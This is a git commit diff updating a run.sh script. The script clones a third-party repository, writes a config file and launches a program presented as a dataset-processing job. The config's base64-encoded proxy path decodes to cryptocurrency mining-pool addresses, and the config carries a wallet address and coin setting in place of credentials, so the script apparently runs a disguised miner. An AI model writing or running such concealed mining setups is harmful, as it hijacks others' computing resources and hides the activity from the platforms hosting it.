62c904803ed76aa56861390019af445ef20226f0
taumino56-netizen <taumino56@gmail.com>
2025-11-28 18:29:39 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Clone the repository
-git clone https://github.com/ismailalkaf/node-mino-app.git
+git clone https://github.com/saxlata/vbg.git
 
 # Navigate into the repository folder
-cd node-mino-app || exit
+cd vbg || exit
 
 # Create a configuration file
-echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==", "user": "rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB", "password": "c=RVN", "argent": "wasm-mino/2.0", "threads": 5}' > data.txt
+echo -e '{"log": true, "proxy": "wss://present-nichol-vivo1-4f3dad8a.koyeb.app/eGVsaXN2Mi1wZXBldy5uYS5taW5lLnpwb29sLmNhOjQ4MzM=", "username": "rM5GziBWoT9y4DQaiacGahTvKZze2TpzrB", "password": "c=RVN,gh", "threads": 8}' > data.txt
 
 # Run the application
-./node app.js
+python3 main.py 7 --dataset=data.txt --output=result.txt
